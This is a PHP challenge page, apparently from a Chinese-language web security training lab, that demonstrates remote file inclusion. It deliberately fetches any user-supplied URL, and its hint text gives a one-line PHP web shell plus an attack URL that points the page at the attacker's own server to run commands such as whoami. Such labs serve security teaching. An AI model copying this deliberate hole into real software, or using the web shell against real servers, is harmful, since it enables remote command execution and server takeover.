<?php
// 远程文件包含
$page = $_GET['page'] ?? '';
$content = null;

if ($page) {
    // 漏洞：允许包含远程URL
    // 注：实际环境中需要 allow_url_include=On
    $content = @file_get_contents($page);
    if ($content !== false && preg_match('#^(https?|ftp|data)://#i', $page)) {
        renderChallengeSuccess($challenge, '远程内容被服务端加载执行');
    }
    if ($content === false) {
        $content = '无法加载：' . h($page);
    }
}
?>

<p>页面加载（远程文件包含）</p>
<p>支持从远程URL加载内容，可被利用包含恶意脚本。</p>

<div style="display:flex; gap:0.5rem; margin-bottom:1rem;">
    <a href="?id=<?= h($_GET['cid'] ?? '') ?>&page=http://example.com" class="btn" style="background:var(--bg-secondary); color:var(--text-secondary);">示例外部页面</a>
</div>

<?php if ($content): ?>
    <div class="result-box"><?= h($content) ?></div>
<?php endif; ?>

<p style="margin-top:1rem; font-size:0.8rem; color:var(--text-muted);">
    攻击方法：在你的VPS上放置一个PHP文件（如 shell.txt 内容为 &lt;?php system($_GET['cmd']); ?&gt;）
    <br>然后 ?page=http://你的IP/shell.txt&cmd=whoami
</p>
